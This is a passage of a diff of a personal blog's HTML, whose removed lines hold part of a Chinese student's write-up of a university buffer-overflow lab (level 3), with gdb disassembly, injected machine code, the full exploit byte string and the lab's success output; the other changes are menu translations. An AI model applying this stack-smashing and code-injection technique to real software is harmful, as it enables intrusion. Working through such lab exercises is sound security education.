class="line">   char* variable_length;</span><br><span class="line">   entry_check(3);  /* Make sure entered this function properly */</span><br><span class="line">   val = getbuf();</span><br><span class="line">   if (val &lt;= 40) &#123;</span><br><span class="line">      variable_length = alloca(val);</span><br><span class="line">   &#125;</span><br><span class="line">   entry_check(3);</span><br><span class="line">   /* Check for corrupted stack */</span><br><span class="line">   if (local != 0xdeadbeef) &#123;</span><br><span class="line">      printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else if (val == cookie) &#123;</span><br><span class="line">      printf(&quot;Boom!: getbuf returned 0x%llx\n&quot;, val);</span><br><span class="line">      if (local != 0xdeadbeef) &#123;</span><br><span class="line">         printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      if (val != cookie) &#123;</span><br><span class="line">         printf(&quot;Sabotaged!: control flow has been disrupted\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      validate(3);</span><br><span class="line">   &#125;</span><br><span class="line">   else &#123;</span><br><span class="line">      printf(&quot;Dud: getbuf returned 0x%llx\n&quot;, val);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>test函数中的val和lobal均为局部变量，局部变量保存在栈中，需要对val赋值同时确保local变量的值不变。首先通过gdb获取两个变量的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000400ed0 &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x0000000000400ed1 &lt;+1&gt;:	mov    $0xdeadbeef,%ecx</span><br><span class="line">   0x0000000000400ed6 &lt;+6&gt;:	xor    %eax,%eax</span><br><span class="line">   0x0000000000400ed8 &lt;+8&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x0000000000400edb &lt;+11&gt;:	push   %rbx</span><br><span class="line">   0x0000000000400edc &lt;+12&gt;:	sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400ee0 &lt;+16&gt;:	mov    %rcx,-0x18(%rbp)</span><br><span class="line">   0x0000000000400ee4 &lt;+20&gt;:	movl   $0x3,0x2013c2(%rip)        # 0x6022b0 &lt;check_level&gt;</span><br><span class="line">   0x0000000000400eee &lt;+30&gt;:	callq  0x400da0 &lt;getbuf&gt;</span><br><span class="line">=&gt; 0x0000000000400ef3 &lt;+35&gt;:	cmp    $0x28,%rax</span><br><span class="line">   0x0000000000400ef7 &lt;+39&gt;:	jbe    0x400f40 &lt;test+112&gt;</span><br></pre></td></tr></table></figure></p>
-<p>通过观察反汇编代码，local变量首先保存在ecx寄存器中，然后又存入-0x18(%rbp)地址处，rbp的值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p /x $rbp</span><br><span class="line">$1 = 0x7fffffffbf00</span><br></pre></td></tr></table></figure></p>
-<p>所以local变量保存的地址为0x7fffffffbee8。变量val保存在rax寄存器中。</p>
-<h4 id="解决过程："><a href="#解决过程：" class="headerlink" title="解决过程："></a>解决过程：</h4><p>首先修改getbuf返回地址为buf数组首地址，即将0x7fffffffbed8地址指向内容更改为0x7fffffffbea0。在输入字符串中写入如下机器码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 b8 de 77 8d 5c 6d    movabs $0x515f786d5c8d77de,%rax</span><br><span class="line">78 5f 51</span><br><span class="line">c3                      retq</span><br></pre></td></tr></table></figure></p>
-<p>执行getbuf函数的ret指令时，rsp的值增加为0x7fffffffbee0，执行机器码后需要再执行一次ret指令返回到test函数。所以比正常情况多执行了一次ret指令，使栈顶指针的值发生了变化为0x7fffffffbee8，为了避免这种情况，我们可以将返回地址压栈，这样就可以保证rsp与正常情况相同，更改后机器码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 b8 de 77 8d 5c 6d    movabs $0x515f786d5c8d77de,%rax</span><br><span class="line">78 5f 51</span><br><span class="line">68 f3 0e 40 00          pushq  $0x400ef3</span><br><span class="line">c3                      retq</span><br></pre></td></tr></table></figure></p>
-<p>通过观察getbuf函数的伪代码，可以发现rbp的值也发生了改变：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">=&gt; 0x0000000000400da0 &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x0000000000400da1 &lt;+1&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x0000000000400da4 &lt;+4&gt;:	sub    $0x30,%rsp</span><br><span class="line">   0x0000000000400da8 &lt;+8&gt;:	lea    -0x30(%rbp),%rdi</span><br><span class="line">   0x0000000000400dac &lt;+12&gt;:	callq  0x400cb0 &lt;Gets&gt;</span><br><span class="line">   ......</span><br><span class="line">   0x0000000000400e19 &lt;+121&gt;:	leaveq</span><br><span class="line">   0x0000000000400e1a &lt;+122&gt;:	retq</span><br></pre></td></tr></table></figure></p>
-<p>getbuf执行时，要先将rbp的值入栈，然后将rsp的值赋给rbp，作为当前函数的栈底指针，函数执行到leave指令时，会将rbp指向地址的值出栈，并赋值给rbp，将rbp还原为调用函数的栈底指针，最后执行ret指令。getbuf函数中，执行push指令前后，rbp和rsp的变化如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#执行push指令前</span><br><span class="line">(gdb) p /x $rbp</span><br><span class="line">$1 = 0x7fffffffbf00</span><br><span class="line">(gdb) x /x $rsp</span><br><span class="line">0x7fffffffbed8:	0x00400ef3</span><br><span class="line">(gdb) ni  #ni为执行一条指令</span><br><span class="line">0x0000000000400da1	132	&#123;&#125;</span><br><span class="line">#执行push指令后</span><br><span class="line">(gdb) p /x $rbp</span><br><span class="line">$2 = 0x7fffffffbf00</span><br><span class="line">(gdb) x /2x $rsp</span><br><span class="line">0x7fffffffbed0:	0xffffbf00	0x00007fff</span><br></pre></td></tr></table></figure></p>
-<p>由上述分析可知，调用函数的rbp值存储的地址是0x7fffffffbed0，此地址的内容已经被字符串覆盖，所以需要将调用函数rbp的值0x00007fffffffbf00写入字符串中。</p>
-<p>最终输入的字符串为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 b8 de 77 8d 5c 6d 78 5f 51 68 f3 0e 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 bf ff ff ff 7f 00 00 a0 be ff ff ff 7f 00 00</span><br></pre></td></tr></table></figure></p>
-<p>运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">exploit.txt</span><br><span class="line">Username: qlbaird</span><br><span class="line">de</span><br><span class="line">77</span><br><span class="line">8d</span><br><span class="line">5c</span><br><span class="line">6d</span><br><span class="line">78</span><br><span class="line">5f</span><br><span class="line">51</span><br><span class="line">Cookie: 0x515f786d5c8d77de</span><br><span class="line">Boom!: getbuf returned 0x515f786d5c8d77de</span><br><span class="line">Level 3 VALID</span><br></pre></td></tr></table></figure></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的实验非常有意思，这门课程的实验共有5个，现在已经完成了3个，准备在不久的将来把这些实验都记录一下。第一次写这么长的博客，虽然可能没有人看，但是写的过程也会对问题进行更深入的思考，自己的理解会更加透彻，以后也一定要坚持下去，希望在找工作前能记录更多有意思的东西。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/04/HSI-buffer-overflow/" data-id="cjgi1qwoy0001s3qwspxhfl22" class="article-share-link">Teilen</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HSI/">HSI</a></li></ul>
 
     </footer>
   </div>
@@ -752,7 +718,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Siguiente &raquo;</a>
   </nav>
 
 </section>
@@ -774,16 +740,16 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
+    <h3 class="widget-title">Nube de Tags</h3>
     <div class="widget tagcloud">
-      <a href="/tags/HSI/" style="font-size: 10px;">HSI</a> <a href="/tags/LLVM/" style="font-size: 20px;">LLVM</a> <a href="/tags/复习/" style="font-size: 15px;">复习</a> <a href="/tags/线程/" style="font-size: 20px;">线程</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a>
+      <a href="/tags/HSI/" style="font-size: 10px;">HSI</a> <a href="/tags/LLVM/" style="font-size: 20px;">LLVM</a> <a href="/tags/复习/" style="font-size: 15px;">复习</a> <a href="/tags/线程/" style="font-size: 20px;">线程</a> <a href="/tags/网络/" style="font-size: 15px;">网络</a>
     </div>
   </div>
 
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archiv</h3>
+    <h3 class="widget-title">Archivos</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li></ul>
     </div>
@@ -793,9 +759,13 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">letzter Beitrag</h3>
+    <h3 class="widget-title">Posts recientes</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/04/30/网络（2）/">网络（2）</a>
+          </li>
         
           <li>
             <a href="/2018/04/27/网络（1）/">网络（1）</a>
@@ -811,10 +781,6 @@
         
           <li>
             <a href="/2018/04/26/线程（1）/">线程（1）</a>
-          </li>
-        
-          <li>
-            <a href="/2018/04/25/Building-C-Projects/">Building C Projects</a>
           </li>
         
       </ul>
